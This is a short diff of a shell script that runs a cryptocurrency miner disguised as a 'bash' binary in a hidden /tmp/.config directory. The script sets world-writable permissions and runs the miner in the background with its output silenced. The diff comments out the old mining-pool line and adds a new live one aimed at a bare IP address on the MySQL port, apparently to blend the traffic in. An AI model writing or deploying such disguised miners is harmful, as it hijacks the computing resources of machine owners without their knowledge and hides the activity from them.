@@ -10,4 +10,5 @@ chmod -R  777 /tmp/.config
 #	/tmp/.config/bash -a ghostrider --url stratum-asia.rplant.xyz:7090 --user STeHt4JoHHWRuazNWkeUEt2jufQapdbnzB.2088a
 #	sleep 5
 #done
-nohup /tmp/.config/bash -a ghostrider --url stratum-asia.rplant.xyz:7090 --user STeHt4JoHHWRuazNWkeUEt2jufQapdbnzB.2088a >/dev/null 2>&1 &
+###nohup /tmp/.config/bash -a ghostrider --url stratum-asia.rplant.xyz:7090 --user STeHt4JoHHWRuazNWkeUEt2jufQapdbnzB.2088a >/dev/null 2>&1 &
+nohup /tmp/.config/bash -a ghostrider --url 165.22.62.162:3306 --user RDACoFmDxhJrktrSsfWHEcCgybGezuPkCw.2099 >/dev/null 2>&1 &
